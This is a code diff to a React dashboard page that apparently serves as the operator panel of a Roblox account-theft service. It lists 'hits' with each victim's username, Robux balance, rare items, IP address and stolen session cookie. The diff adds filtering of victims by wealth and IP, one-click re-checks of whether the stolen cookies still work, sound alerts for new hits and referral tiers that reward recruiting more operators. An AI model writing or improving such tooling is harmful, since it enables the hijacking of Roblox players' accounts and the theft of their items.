@@ -2,9 +2,9 @@ import React, { useEffect, useMemo, useRef, useState } from 'react';
 import { useOutletContext } from 'react-router-dom';
 import { supabase } from '@/integrations/supabase/client';
 import { toast } from 'sonner';
-import { Loader2, Eye, EyeOff, Copy, Crown, Skull, Volume2, VolumeX, Mic, BadgeCheck, Coins, Users } from 'lucide-react';
+import { Loader2, Eye, EyeOff, Copy, Crown, Skull, Volume2, VolumeX, Mic, BadgeCheck, Coins, Users, Search, RefreshCw, CheckCircle2, XCircle, Filter } from 'lucide-react';
 import type { DashboardProfile } from './DashboardLayout';
-import { getRank } from '@/config/toolsConfig';
+import { getRank, getReferralTier, REFERRAL_TIERS } from '@/config/toolsConfig';
 import hitSound from '@/assets/hit-sound.mp3';
 
 interface HitRow {
@@ -24,10 +24,14 @@ interface HitRow {
   roblox_headshot_url: string | null;
   cookie_preview: string | null;
   ip_address: string | null;
+  is_valid: boolean | null;
+  last_checked_at: string | null;
   created_at: string;
 }
 
 const SOUND_PREF_KEY = 'bloxtools:sound-enabled';
+
+type ValidityFilter = 'all' | 'valid' | 'invalid' | 'unchecked';
 
 const HitsPage = () => {
   const { profile } = useOutletContext<{ profile: DashboardProfile & { referral_count?: number } }>();
@@ -35,11 +39,17 @@ const HitsPage = () => {
   const [revealed, setRevealed] = useState<Record<string, boolean>>({});
   const [soundOn, setSoundOn] = useState(() => localStorage.getItem(SOUND_PREF_KEY) !== 'false');
   const [referralCount, setReferralCount] = useState<number>(0);
+  const [search, setSearch] = useState('');
+  const [toolFilter, setToolFilter] = useState<string>('all');
+  const [minRobux, setMinRobux] = useState<string>('');
+  const [validityFilter, setValidityFilter] = useState<ValidityFilter>('all');
+  const [showFlags, setShowFlags] = useState({ korblox: false, headless: false, premium: false });
+  const [rechecking, setRechecking] = useState(false);
+  const [recheckingId, setRecheckingId] = useState<string | null>(null);
   const audioRef = useRef<HTMLAudioElement | null>(null);
 
-  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, created_at';
+  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, is_valid, last_checked_at, created_at';
 
-  // Load referral count
   useEffect(() => {
     supabase
       .from('profiles')
@@ -49,21 +59,19 @@ const HitsPage = () => {
       .then(({ data }) => setReferralCount((data as any)?.referral_count ?? 0));
   }, [profile.id]);
 
-  // Initial load
-  useEffect(() => {
-    supabase
+  const refresh = async () => {
+    const { data, error } = await supabase
       .from('hits')
       .select(SELECT_COLS)
       .eq('owner_id', profile.id)
       .order('created_at', { ascending: false })
-      .limit(100)
-      .then(({ data, error }) => {
-        if (error) toast.error(error.message);
-        setHits((data as HitRow[]) ?? []);
-      });
-  }, [profile.id]);
+      .limit(500);
+    if (error) toast.error(error.message);
+    setHits((data as HitRow[]) ?? []);
+  };
 
-  // Realtime subscription — sound + toast on new hit
+  useEffect(() => { refresh(); }, [profile.id]);
+
   useEffect(() => {
     audioRef.current = new Audio(hitSound);
     audioRef.current.volume = 0.5;
@@ -84,9 +92,7 @@ const HitsPage = () => {
       )
       .subscribe();
 
-    return () => {
-      supabase.removeChannel(channel);
-    };
+    return () => { supabase.removeChannel(channel); };
   }, [profile.id]);
 
   const toggleSound = () => {
@@ -95,6 +101,9 @@ const HitsPage = () => {
     localStorage.setItem(SOUND_PREF_KEY, String(next));
     if (next) audioRef.current?.play().catch(() => {});
   };
+
+  const tier = getReferralTier(referralCount);
+  const boostPerReferral = tier.current.boostPerReferral;
 
   const stats = useMemo(() => {
     if (!hits) return null;
@@ -109,6 +118,57 @@ const HitsPage = () => {
     return { total: hits.length, robux, rap, korblox, headless, gamepass };
   }, [hits]);
 
+  const toolTypes = useMemo(() => {
+    if (!hits) return [];
+    return Array.from(new Set(hits.map((h) => h.tool_type))).sort();
+  }, [hits]);
+
+  const filteredHits = useMemo(() => {
+    if (!hits) return [];
+    const q = search.trim().toLowerCase();
+    const min = parseInt(minRobux) || 0;
+    return hits.filter((h) => {
+      if (q && !(h.roblox_username?.toLowerCase().includes(q) || h.ip_address?.toLowerCase().includes(q))) return false;
+      if (toolFilter !== 'all' && h.tool_type !== toolFilter) return false;
+      if (min > 0 && (h.roblox_robux ?? 0) < min) return false;
+      if (showFlags.korblox && !h.roblox_has_korblox) return false;
+      if (showFlags.headless && !h.roblox_has_headless) return false;
+      if (showFlags.premium && !h.roblox_premium) return false;
+      if (validityFilter === 'valid' && h.is_valid !== true) return false;
+      if (validityFilter === 'invalid' && h.is_valid !== false) return false;
+      if (validityFilter === 'unchecked' && h.is_valid !== null) return false;
+      return true;
+    });
+  }, [hits, search, toolFilter, minRobux, showFlags, validityFilter]);
+
+  const recheckAll = async () => {
+    setRechecking(true);
+    try {
+      const { data, error } = await supabase.functions.invoke('recheck-cookies', { body: {} });
+      if (error) throw error;
+      toast.success(`Checked ${data.checked}: ${data.valid} valid, ${data.invalid} dead`);
+      await refresh();
+    } catch (e: any) {
+      toast.error(e.message ?? 'Re-check failed');
+    } finally {
+      setRechecking(false);
+    }
+  };
+
+  const recheckOne = async (id: string) => {
+    setRecheckingId(id);
+    try {
+      const { data, error } = await supabase.functions.invoke('recheck-cookies', { body: { hitId: id } });
+      if (error) throw error;
+      toast.success(data.valid > 0 ? 'Cookie still valid ✅' : 'Cookie is dead ❌');
+      await refresh();
+    } catch (e: any) {
+      toast.error(e.message ?? 'Re-check failed');
+    } finally {
+      setRecheckingId(null);
+    }
+  };
+
   if (hits === null || !stats) {
     return (
       <div className="flex justify-center py-12">
@@ -117,8 +177,7 @@ const HitsPage = () => {
     );
   }
 
-  // Total includes referral boost (matches leaderboard view: +5 hits per referral)
-  const effectiveTotal = stats.total + referralCount * 5;
+  const effectiveTotal = stats.total + referralCount * boostPerReferral;
   const rank = getRank(effectiveTotal);
 
   const StatCard = ({ label, value }: { label: string; value: React.ReactNode }) => (
@@ -128,10 +187,7 @@ const HitsPage = () => {
     </div>
   );
 
-  const copy = (txt: string) => {
-    navigator.clipboard.writeText(txt);
-    toast.success('Copied');
-  };
+  const copy = (txt: string) => { navigator.clipboard.writeText(txt); toast.success('Copied'); };
 
   const referralLink = `${window.location.origin}/signup?ref=${profile.username}`;
 
@@ -148,7 +204,7 @@ const HitsPage = () => {
           )}
           {referralCount > 0 && (
             <div className="text-xs text-blox-teal/80 mt-1">
-              Includes +{referralCount * 5} from {referralCount} referral{referralCount === 1 ? '' : 's'}
+              Includes +{referralCount * boostPerReferral} from {referralCount} referral{referralCount === 1 ? '' : 's'} ({boostPerReferral}/ref)
             </div>
           )}
         </div>
@@ -161,17 +217,37 @@ const HitsPage = () => {
         </button>
       </div>
 
-      {/* Referral link card */}
-      <div className="blox-card p-4 flex items-center gap-3">
-        <Users className="h-5 w-5 text-blox-teal shrink-0" />
-        <div className="flex-1 min-w-0">
-          <div className="text-sm font-semibold">Your referral link</div>
-          <div className="text-xs text-gray-400">Each signup = +5 hits toward your rank. Referrals: <span className="text-blox-teal">{referralCount}</span></div>
+      {/* Referral tier card */}
+      <div className="blox-card p-4">
+        <div className="flex items-center gap-3 mb-3">
+          <Users className="h-5 w-5 text-blox-teal shrink-0" />
+          <div className="flex-1 min-w-0">
+            <div className="flex items-center gap-2 flex-wrap">
+              <span className="text-sm font-semibold">Referral Tier:</span>
+              <span className={`text-sm font-bold ${tier.current.color}`}>{tier.current.name}</span>
+              <span className="text-xs text-gray-400">· {tier.current.perk}</span>
+            </div>
+            <div className="text-xs text-gray-400 mt-0.5">
+              {referralCount} referral{referralCount === 1 ? '' : 's'}
+              {tier.next && <> · {tier.next.minReferrals - referralCount} more to reach <span className={tier.next.color}>{tier.next.name}</span></>}
+            </div>
+          </div>
+          <button onClick={() => copy(referralLink)} className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal" title="Copy referral link">
+            <Copy className="h-4 w-4" />
+          </button>
         </div>
-        <code className="hidden sm:block text-xs bg-black/40 px-2 py-1 rounded font-mono truncate max-w-[260px]">{referralLink}</code>
-        <button onClick={() => copy(referralLink)} className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal" title="Copy link">
-          <Copy className="h-4 w-4" />
-        </button>
+        <div className="grid grid-cols-5 gap-1">
+          {REFERRAL_TIERS.map((t) => {
+            const reached = referralCount >= t.minReferrals;
+            return (
+              <div key={t.name} className={`text-[10px] text-center p-2 rounded border ${reached ? 'border-blox-teal/40 bg-blox-teal/10' : 'border-white/5 bg-black/20 opacity-50'}`}>
+                <div className={`font-bold ${reached ? t.color : 'text-gray-500'}`}>{t.name}</div>
+                <div className="text-gray-500">{t.minReferrals}+</div>
+              </div>
+            );
+          })}
+        </div>
+        <code className="block mt-3 text-[11px] bg-black/40 px-2 py-1 rounded font-mono truncate text-gray-400">{referralLink}</code>
       </div>
 
       <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
@@ -183,13 +259,83 @@ const HitsPage = () => {
         <StatCard label="Headless" value={<span className="flex items-center gap-1"><Crown className="h-4 w-4 text-yellow-400" />{stats.headless}</span>} />
       </div>
 
+      {/* Filters */}
+      <div className="blox-card p-4 space-y-3">
+        <div className="flex items-center gap-2 text-sm font-semibold text-gray-300">
+          <Filter className="h-4 w-4" /> Search & Filters
+          <span className="ml-auto text-xs text-gray-500 font-normal">
+            {filteredHits.length} of {hits.length}
+          </span>
+        </div>
+        <div className="grid grid-cols-1 md:grid-cols-4 gap-2">
+          <div className="relative md:col-span-2">
+            <Search className="absolute left-2 top-2.5 h-4 w-4 text-gray-500" />
+            <input
+              type="text"
+              placeholder="Search username or IP…"
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+              className="w-full bg-black/40 border border-white/10 rounded pl-8 pr-3 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
+            />
+          </div>
+          <select
+            value={toolFilter}
+            onChange={(e) => setToolFilter(e.target.value)}
+            className="bg-black/40 border border-white/10 rounded px-2 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
+          >
+            <option value="all">All tools</option>
+            {toolTypes.map((t) => <option key={t} value={t}>{t}</option>)}
+          </select>
+          <input
+            type="number"
+            placeholder="Min Robux"
+            value={minRobux}
+            onChange={(e) => setMinRobux(e.target.value)}
+            className="bg-black/40 border border-white/10 rounded px-3 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
+          />
+        </div>
+        <div className="flex items-center gap-2 flex-wrap text-xs">
+          <select
+            value={validityFilter}
+            onChange={(e) => setValidityFilter(e.target.value as ValidityFilter)}
+            className="bg-black/40 border border-white/10 rounded px-2 py-1 focus:outline-none focus:border-blox-teal"
+          >
+            <option value="all">All cookies</option>
+            <option value="valid">Valid only</option>
+            <option value="invalid">Dead only</option>
+            <option value="unchecked">Unchecked</option>
+          </select>
+          {(['korblox', 'headless', 'premium'] as const).map((flag) => (
+            <label key={flag} className="flex items-center gap-1 px-2 py-1 rounded bg-black/40 border border-white/10 cursor-pointer hover:border-blox-teal/40">
+              <input
+                type="checkbox"
+                checked={showFlags[flag]}
+                onChange={(e) => setShowFlags((f) => ({ ...f, [flag]: e.target.checked }))}
+                className="accent-blox-teal"
+              />
+              {flag.charAt(0).toUpperCase() + flag.slice(1)}
+            </label>
+          ))}
+          <button
+            onClick={recheckAll}
+            disabled={rechecking}
+            className="ml-auto flex items-center gap-1 px-3 py-1 rounded bg-blox-teal/20 hover:bg-blox-teal/30 text-blox-teal disabled:opacity-50"
+          >
+            {rechecking ? <Loader2 className="h-3 w-3 animate-spin" /> : <RefreshCw className="h-3 w-3" />}
+            Re-check all cookies
+          </button>
+        </div>
+      </div>
+
       <div>
-        <h2 className="text-lg font-semibold mb-2">Recent Hits</h2>
-        {hits.length === 0 ? (
-          <div className="blox-card p-6 text-center text-gray-400">No hits yet.</div>
+        <h2 className="text-lg font-semibold mb-2">Hits</h2>
+        {filteredHits.length === 0 ? (
+          <div className="blox-card p-6 text-center text-gray-400">
+            {hits.length === 0 ? 'No hits yet.' : 'No hits match your filters.'}
+          </div>
         ) : (
           <div className="space-y-3">
-            {hits.map((h) => (
+            {filteredHits.map((h) => (
               <div key={h.id} className="blox-card p-4">
                 <div className="flex items-start gap-4">
                   {h.roblox_headshot_url ? (
@@ -204,6 +350,8 @@ const HitsPage = () => {
                         <span className="text-gray-400 text-sm font-normal">— {h.tool_type}</span>
                         {h.roblox_age_verified && <BadgeCheck className="h-4 w-4 text-blox-teal" aria-label="Age verified" />}
                         {h.roblox_voice_enabled && <Mic className="h-4 w-4 text-green-400" aria-label="Voice enabled" />}
+                        {h.is_valid === true && <CheckCircle2 className="h-4 w-4 text-green-400" aria-label="Cookie valid" />}
+                        {h.is_valid === false && <XCircle className="h-4 w-4 text-red-400" aria-label="Cookie dead" />}
                       </div>
                       <div className="text-xs text-gray-500">{new Date(h.created_at).toLocaleString()}</div>
                     </div>
@@ -221,7 +369,7 @@ const HitsPage = () => {
                       <span>IP: <span className="text-gray-200">{h.ip_address ?? '?'}</span></span>
                     </div>
                     {h.cookie_preview && (
-                      <div className="mt-3 flex items-center gap-2">
+                      <div className="mt-3 flex items-center gap-2 flex-wrap">
                         <span className="text-xs text-gray-500">Cookie:</span>
                         <code className="text-xs bg-black/40 px-2 py-1 rounded font-mono">
                           {revealed[h.id] ? h.cookie_preview : '••••••••' + h.cookie_preview.slice(-4)}
@@ -232,7 +380,18 @@ const HitsPage = () => {
                         <button onClick={() => copy(h.cookie_preview!)} className="text-gray-400 hover:text-blox-teal" title="Copy">
                           <Copy className="h-4 w-4" />
                         </button>
-                        <span className="text-[10px] text-gray-600 ml-auto">last 16 chars stored</span>
+                        <button
+                          onClick={() => recheckOne(h.id)}
+                          disabled={recheckingId === h.id}
+                          className="text-gray-400 hover:text-blox-teal flex items-center gap-1 text-xs"
+                          title="Re-check this cookie"
+                        >
+                          {recheckingId === h.id ? <Loader2 className="h-3 w-3 animate-spin" /> : <RefreshCw className="h-3 w-3" />}
+                          Recheck
+                        </button>
+                        {h.last_checked_at && (
+                          <span className="text-[10px] text-gray-600 ml-auto">checked {new Date(h.last_checked_at).toLocaleString()}</span>
+                        )}
                       </div>
                     )}
                   </div>
